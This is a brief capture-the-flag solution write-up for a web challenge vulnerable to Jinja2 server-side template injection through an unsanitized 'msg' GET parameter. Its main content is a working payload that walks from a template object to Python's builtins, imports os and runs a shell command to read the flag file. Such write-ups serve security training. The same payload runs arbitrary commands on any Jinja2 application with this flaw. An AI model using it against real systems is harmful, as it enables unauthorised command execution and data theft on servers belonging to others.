# Solution

This challenge has SSTI (Server Side Template Injection) vulnerability.
The msg GET parameter is not sanitized and can be used to inject Jinja2 template code.
The following payload can be used to read the flag:

```py
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag*').read() }}
```